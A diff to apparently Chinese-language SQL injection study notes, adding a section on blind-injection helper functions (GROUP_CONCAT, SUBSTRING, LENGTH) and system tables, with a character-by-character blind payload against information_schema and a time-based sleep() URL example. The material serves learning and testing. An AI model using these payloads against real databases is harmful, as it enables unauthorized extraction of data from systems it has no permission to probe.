@@ -113,6 +113,39 @@ join运算用于基于一个关联的列，来连接（组合）两个或多个�
 
 例如：```https://my-shop.com?article=4 ; sleep(4)```
 
+
+### 盲注常用函数
+
+#### GROUP_CONCAT(列名) 
+
+连接所有结果为一个字符串。
+
+例如：```SELECT group_concat(TABLE_NAME) FROM information_schema.tables```
+
+#### SUBSTRING(字符串,起始位置i,长度l)
+
+返回字符串从第i(i=1,..,n)个起始位置，长度为l的字串。
+
+```tom' and substring((SELECT group_concat(COLUMN_NAME) FROM information_schema.columns where TABLE_NAME='EMPLOYEE' ),1,1)='a' ; --```
+
+上面的语句中的第一个1和‘a'处，可以使用FUZZ payload设置，实现盲注测试。
+
+#### LENGTH(字符串)
+返回字符串长度。
+
+```SELECT LENGTH(group_concat(TABLE_NAME)) FROM information_schema.tables```
+
+#### database_version() , VERSION()等
+
+#### database_name() 等
+
+
+### 常用系统表
+#### information_schema.tables 
+
+#### information_schema.columns 
+
+
 ## 绕过WAF
 
 在这里，需要清楚WAF拦截的是payload的哪一部分。
